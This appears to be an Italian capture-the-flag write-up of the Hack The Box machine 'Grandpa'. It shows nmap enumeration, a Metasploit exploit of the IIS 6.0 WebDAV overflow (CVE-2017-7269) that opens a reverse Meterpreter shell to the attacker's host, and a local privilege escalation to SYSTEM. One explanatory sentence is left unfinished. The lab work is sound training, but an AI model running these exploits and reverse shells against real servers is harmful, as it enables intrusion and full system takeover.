---
title: Grandpa Walkthrough
description: Grandpa è una delle macchine più semplici su Hack The Box, tuttavia tratta l'ampiamente sfruttata vulnerabilità CVE-2017-7269. Questa vulnerabilità è banale da sfruttare e, quando divenne di dominio pubblico, concesse accesso immediato a migliaia di server IIS in tutto il mondo.
author: dua2z3rr
date: 2025-10-14 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Vulnerability Assessment", "Area di Interesse: Software & OS exploitation", "Area di Interesse: Security Tools", "Vulnerabilità: Arbitrary File Upload", "Vulnerabilità: Misconfiguration", "Codice: ASP"]
image: /assets/img/grandpa/grandpa-resized.png
---

## Enumerazione Esterna

### Nmap

Cominciamo con uno scan di nmap.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.14 -vv -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Tue, 14 Oct 2025 07:16:21 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Ricerca exploit

Questa versione di IIS è molto famosa perchè permette, attraverso una richiesta **PUT**.

### Exploitation

```shell
[msf](Jobs:0 Agents:0) >> search iis_webdav_scstoragepathfromurl

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set RHOST 10.10.10.14
RHOST => 10.10.10.14
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set LPORT 50321
LPORT => 50321
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> route
[*] There are currently no routes defined.
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> run
[*] Started reverse TCP handler on 10.10.16.9:50321 
[*] Trying path length 3 to 60 ...
[*] Sending stage (177734 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.16.9:50321 -> 10.10.10.14:1030) at 2025-10-14 20:07:58 +0200

(Meterpreter 1)(c:\windows\system32\inetsrv) > whoami
[-] Unknown command: whoami. Run the help command for more details.
(Meterpreter 1)(c:\windows\system32\inetsrv) > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

Dobbiamo migrare la shell da un processo a un altro. Se non lo facciamo, non potremmo procedere.

```shell
(Meterpreter 1)(c:\windows\system32\inetsrv) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 600   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 772   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 988   392   msdtc.exe
 1072  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1376  392   VGAuthService.exe
 1412  392   vmtoolsd.exe
 1496  392   svchost.exe
 1516  344   logon.scr
 1604  392   svchost.exe
 1712  392   alg.exe
 1776  600   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1884  392   dllhost.exe
 2364  600   wmiprvse.exe
 2728  1496  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2848  600   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2904  2728  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3752  1072  cidaemon.exe
 3796  1072  cidaemon.exe
 3824  1072  cidaemon.exe

(Meterpreter 1)(c:\windows\system32\inetsrv) > migrate 1776
[*] Migrating from 2904 to 1776...
[*] Migration completed successfully.
```

## Privilege Escalation

Procediamo a utilizzare lo stesso exploit per privilege escalation che abbiamo usato con **granny**.

```shell
[msf](Jobs:0 Agents:1) exploit(windows/local/ms10_015_kitrap0d) >> use exploit/windows/local/ms15_051_client_copy_image
[*] Using configured payload windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set LHOST tun0
LHOST => 10.10.16.9
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> run
[*] Started reverse TCP handler on 10.10.16.9:40012 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 4076 launched.
[*] Reflectively injecting the DLL into 4076...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.16.9:40012 -> 10.10.10.14:1031) at 2025-10-14 20:21:53 +0200

(Meterpreter 2)(C:\WINDOWS\system32) > shell
Process 408 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

Prendiamo le flag e terminiamo la box.
